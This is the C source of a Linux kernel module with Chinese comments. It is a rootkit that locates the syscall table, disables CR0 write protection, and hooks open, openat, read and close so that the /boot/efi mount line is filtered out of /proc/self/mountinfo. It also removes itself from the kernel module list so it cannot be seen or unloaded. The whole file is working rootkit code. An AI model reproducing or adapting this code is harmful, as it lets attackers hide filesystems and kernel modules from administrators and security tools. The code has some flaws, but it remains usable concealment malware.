#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>
#include <asm/types.h>
#include <asm/processor.h>
#include <asm/segment.h>
#include <asm/unistd.h>
#include <linux/version.h>


//要隐藏的文件系统的根目录名(前后要各加上一个空格)
#define HIDDEN_FS_FILE_PATH " /boot/efi "
//proc文件系统中保存内核的文件系统信息的文件名
#define MOUNTINFO_FILE_NAME "/proc/self/mountinfo"
#define FIRST_CHAR_OF_HIDDEN_FS_FILE_PATH ' '
#define MOUNTINFO_MAX_LENGTH 131072

MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");

unsigned long *sys_call_table = 0;			/*系统调用表的指针*/

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);		/* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
kallsyms_lookup_name_t kallsyms_lookup_name_p;		/*kallsyms_lookup_name_t函数指针*/

/*
设置cr0寄存器的第16位为0，并把原始的cr0寄存器的值返回
*/
unsigned int set_cr0_16_0(void)	
{
   	unsigned int cr0 = 0;
   	unsigned int ret;
    /* 前者用在32位系统。后者用在64位系统，本系统64位 */
    //asm volatile ("movl %%cr0, %%eax" : "=a"(cr0));	
   	asm volatile ("movq %%cr0, %%rax" : "=a"(cr0));	/* 将cr0寄存器的值移动到rax寄存器中，同时输出到cr0变量中 */
    ret = cr0;
	cr0 &= 0xfffeffff;	/* 将cr0变量值中的第16位清0，将修改后的值写入cr0寄存器 */
	//asm volatile ("movl %%eax, %%cr0" :: "a"(cr0));
	asm volatile ("movq %%rax, %%cr0" :: "a"(cr0));	/* 读取cr0的值到rax寄存器，再将rax寄存器的值放入cr0中 */
	return ret;
}

/*
读取val的值到rax寄存器，再将rax寄存器的值放入cr0中
*/
void setback_cr0(unsigned int val)
{	

	//asm volatile ("movl %%eax, %%cr0" :: "a"(val));
	asm volatile ("movq %%rax, %%cr0" :: "a"(val));
}

/*
获取kallsyms_lookup_name函数指针
*/
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
static void get_kallsyms_lookup_name(void) {
  	/* register the kprobe */
  	register_kprobe(&kp);

  	/* assign kallsyms_lookup_name symbol to kp.addr */
  	kallsyms_lookup_name_p = (kallsyms_lookup_name_t) kp.addr;
    
  	/* done with the kprobe, so unregister it */
  	unregister_kprobe(&kp);
}

/*==================start hook systemcall=========================*/
static void hook_systemcall_init(void)
{
	get_kallsyms_lookup_name();
	sys_call_table=(unsigned long *) kallsyms_lookup_name_p("sys_call_table");			/* 获取系统调用服务首地址 */
}

typedef long (*hook_t)(const struct pt_regs * pt_registers);

/*
hook系统调用

Parameters
----------
systemcall_num:要替换的系统调用的系统调用号
hook:要替换的新的系统调用函数

Return
------
返回旧的系统调用函数
*/
static hook_t hook_systemcall(unsigned int systemcall_num,hook_t hook)
{
	int orig_cr0;		/*原始cr0寄存器的值*/
	hook_t orig_systemcall;
	orig_systemcall=(hook_t)(sys_call_table[systemcall_num]);		/* 保存原始系统调用 */
	orig_cr0 = set_cr0_16_0();	/* 设置cr0可更改 */
	sys_call_table[systemcall_num]=(unsigned long int)hook;		/* 更改原始的系统调用服务地址 */
	setback_cr0(orig_cr0);	/* 设置为原始的只读cr0 */
	return orig_systemcall;
}

/*
恢复原本的系统调用

Parameters
----------
systemcall_num:系统调用号
orig_systemcall:旧的系统调用
*/
static void unhook_systemcall(unsigned int systemcall_num,hook_t orig_systemcall)
{
	int orig_cr0;		/*原始cr0寄存器的值*/
 	orig_cr0 = set_cr0_16_0();	/* 设置cr0中对sys_call_table的更改权限 */
	sys_call_table[systemcall_num]=(unsigned long int)orig_systemcall;			/*恢复原始系统调用*/
    	setback_cr0(orig_cr0);	/* 恢复原有的中断向量表中的函数指针的值 */
}
/*================end hook systemcall=========================*/

//一些关于/proc/slef/mountinfo的打开文件的全局信息
struct processor_open_mountinfo
{
	int vaild;
	pid_t pid;
	unsigned int mountinfo_fd;
	//int mountinfo_size;
	unsigned int mountinfo_read_offset;
	struct processor_open_mountinfo *next;
};
struct processor_open_mountinfo * process_open_mountiinfo_list;
static char * mountinfo_content=NULL;
static int mountinfo_size=0;


hook_t orig_openat;

/*
hook系统调用openat
*/
asmlinkage long my_openat(const struct pt_regs * pt_registers)
{
	int ret=orig_openat(pt_registers),err;
	char * openat_filename=kvzalloc(sizeof(MOUNTINFO_FILE_NAME),GFP_KERNEL);
	struct processor_open_mountinfo *process_open_mountiinfo_current;
	
	err=copy_from_user(openat_filename,(char *)pt_registers->si,sizeof(MOUNTINFO_FILE_NAME));
	
	//检查要打开的文件是不是/proc/slef/mountinfo，如果是的话就记录下一些全局信息，准备给read系统调用使用
	if(err == 0 && memcmp(openat_filename,MOUNTINFO_FILE_NAME,sizeof(MOUNTINFO_FILE_NAME))==0)
	{
		if((process_open_mountiinfo_current=kvzalloc(sizeof(struct processor_open_mountinfo),GFP_KERNEL))==NULL)
		{
			return ret;
		}
		process_open_mountiinfo_current->pid=task_pid_nr(current);
		process_open_mountiinfo_current->mountinfo_fd=ret;
		process_open_mountiinfo_current->mountinfo_read_offset=0;
		
		process_open_mountiinfo_current->next=process_open_mountiinfo_list->next;
		process_open_mountiinfo_list->next=process_open_mountiinfo_current;
	}
	
	kvfree(openat_filename);
	
	return ret;
}

hook_t orig_open;

/*
hook系统调用open
*/
asmlinkage long my_open(const struct pt_regs * pt_registers)
{
	int ret=orig_open(pt_registers),err;
	char * openat_filename=kvzalloc(sizeof(MOUNTINFO_FILE_NAME),GFP_KERNEL);
	struct processor_open_mountinfo *process_open_mountiinfo_current;
	
	err=copy_from_user(openat_filename,(char *)pt_registers->di,sizeof(MOUNTINFO_FILE_NAME));
	
	//检查要打开的文件是不是/proc/slef/mountinfo，如果是的话就记录下一些全局信息，准备给read系统调用使用
	if(err == 0 && memcmp(openat_filename,MOUNTINFO_FILE_NAME,sizeof(MOUNTINFO_FILE_NAME))==0)
	{
		if((process_open_mountiinfo_current=kvzalloc(sizeof(struct processor_open_mountinfo),GFP_KERNEL))==NULL)
		{
			return ret;
		}
		process_open_mountiinfo_current->pid=task_pid_nr(current);
		process_open_mountiinfo_current->mountinfo_fd=ret;
		process_open_mountiinfo_current->mountinfo_read_offset=0;
		
		process_open_mountiinfo_current->next=process_open_mountiinfo_list->next;
		process_open_mountiinfo_list->next=process_open_mountiinfo_current;
	}
	
	kvfree(openat_filename);
	
	return ret;
}

hook_t orig_read;

/*
hook系统调用read
*/
asmlinkage long my_read(const struct pt_regs * pt_registers)
{
	int ret=orig_read(pt_registers),err,line_start,line_end,tag;
	unsigned int fd=pt_registers->di,mountinfo_read_offset;
	size_t count=pt_registers->dx;
	struct processor_open_mountinfo * process_open_mountiinfo_current=process_open_mountiinfo_list->next;
	pid_t current_pid=task_pid_nr(current);
	
	//从所有打开了/proc/self/mountinfo的进程中查找,如果有当前的进程的话,检测该进程打开文件句柄是不是/proc/self/mountinfo
	while(process_open_mountiinfo_current)
	{
		if(current_pid==process_open_mountiinfo_current->pid && fd==process_open_mountiinfo_current->mountinfo_fd)
		{
			break;
		}
		process_open_mountiinfo_current=process_open_mountiinfo_current->next;
	}
	
	//先检查要读取的文件是不是打开的/proc/slef/mountinfo
	if(process_open_mountiinfo_current)
	{
		if(mountinfo_content==NULL)			//如果是第一次读取/proc/slef/mountinfo的话，就不断地调用旧的read系统调用，将其所有的内容读出来，保存在内核中的一个字符串中
		{
			mountinfo_size=0;
			mountinfo_content=kvzalloc(MOUNTINFO_MAX_LENGTH,GFP_KERNEL);
			if(mountinfo_content==NULL)
			{
				return 0;
			}
			while(ret!=0)
			{
				err=copy_from_user(mountinfo_content+mountinfo_size,(char *)pt_registers->si,ret);
				if(err!=0)
				{
					kvfree(mountinfo_content);
					mountinfo_content=NULL;
					return 0;
				}
				mountinfo_size+=ret;
				ret=orig_read(pt_registers);
			}
			
			//接下来检查读取出来的/proc/slef/mountinfo的每一行，如果发现有一行的内容和要隐藏的文件系统匹配的话，就将这一行的内容删除
			line_start=0;
			tag=0;
			for(mountinfo_read_offset=0;mountinfo_read_offset<mountinfo_size;mountinfo_read_offset++)
			{
				if((mountinfo_size-mountinfo_read_offset)<sizeof(HIDDEN_FS_FILE_PATH))
				{
					break;
				}
				switch(mountinfo_content[mountinfo_read_offset])
				{
					case '\n':
						if(tag==1)
						{
							line_end=mountinfo_read_offset;
							while(line_end<mountinfo_size)
							{
								mountinfo_content[line_start]=mountinfo_content[line_end];
								line_start++;
								line_end++;
							}
							mountinfo_size-=(line_end-line_start);
							goto end;
						}
						else
						{
							line_start=mountinfo_read_offset;
						}
						break;
					case FIRST_CHAR_OF_HIDDEN_FS_FILE_PATH:
						if(tag==0 && memcmp(mountinfo_content+mountinfo_read_offset,HIDDEN_FS_FILE_PATH,sizeof(HIDDEN_FS_FILE_PATH)-1)==0)
						{
							tag=1;
						}
						break;
				}
			}
			end:
			mountinfo_read_offset=0;
		}
		
		
		//之后每一次调用read读取/proc/slef/mountinfo的内容的时候都直接从内核中读取相应的字符串进行返回即可
		mountinfo_read_offset=process_open_mountiinfo_current->mountinfo_read_offset;
		if((mountinfo_size-mountinfo_read_offset)<count)
		{
			count=(mountinfo_size-mountinfo_read_offset);
		}
		err=copy_to_user((char *)pt_registers->si,mountinfo_content+mountinfo_read_offset,count);
		if(err!=0)
		{
			return 0;
		}
		process_open_mountiinfo_current->mountinfo_read_offset+=count;
		ret=count;
	}
	
	return ret;
}

hook_t orig_close;

/*
hook系统调用close
*/
asmlinkage long my_close(const struct pt_regs * pt_registers)
{
	int ret=orig_close(pt_registers);
	unsigned int fd=pt_registers->di;
	struct processor_open_mountinfo * process_open_mountiinfo_current=process_open_mountiinfo_list->next,*tmp=process_open_mountiinfo_list;
	pid_t current_pid=task_pid_nr(current);
	
	//查看当前的进程是不是打开了/proc/self/mountinfo的话,如果是的话,再判断关闭的是不是/proc/self/mountinfo
	while(process_open_mountiinfo_current)
	{
		if(current_pid==process_open_mountiinfo_current->pid && fd==process_open_mountiinfo_current->mountinfo_fd)
		{
			break;
		}
		process_open_mountiinfo_current=process_open_mountiinfo_current->next;
		tmp=tmp->next;
	}
	
	
	//如果要关闭的文件是/proc/slef/mountinfo，就将对应的全局信息清空，然后释放内核中用于保存/proc/slef/mountinfo内容的字符串的空间即可
	if(process_open_mountiinfo_current)
	{
		tmp->next=process_open_mountiinfo_current->next;
		kvfree(process_open_mountiinfo_current);
	}
	
	return ret;
}

static struct list_head *prev_module;
static short hidden=0;

/*
显示隐藏的当前模块
*/
void showme(void)
{
	list_add(&THIS_MODULE->list,prev_module);
	hidden=0;
}

/*
隐藏当前模块
*/
void hideme(void)
{
	prev_module=THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	hidden=1;
}


/*模块的初始化函数，模块的入口函数，加载模块*/
static int __init init_hidden_fs(void)
{
	process_open_mountiinfo_list=kvzalloc(sizeof(struct processor_open_mountinfo),GFP_KERNEL);
	if(process_open_mountiinfo_list)
	{
		process_open_mountiinfo_list->next=NULL;
		
		hook_systemcall_init();
   		orig_openat=hook_systemcall(__NR_openat,my_openat);
   		orig_open=hook_systemcall(__NR_open,my_open);
   		orig_close=hook_systemcall(__NR_close,my_close);
   		orig_read=hook_systemcall(__NR_read,my_read);
   		hideme();
	}
	return 0;
}

/*出口函数，卸载模块(卸载不了,因为隐藏了)*/
static void __exit exit_hidden_fs(void)
{
	if(process_open_mountiinfo_list)
	{
		kvfree(process_open_mountiinfo_list);
		
		if(mountinfo_content)
		{
			kvfree(mountinfo_content);
		}
		
		unhook_systemcall(__NR_openat,orig_openat);
		unhook_systemcall(__NR_open,orig_open);
   		unhook_systemcall(__NR_close,orig_close);
   		unhook_systemcall(__NR_read,orig_read);
   		showme();
	}
}

module_init(init_hidden_fs);
module_exit(exit_hidden_fs);
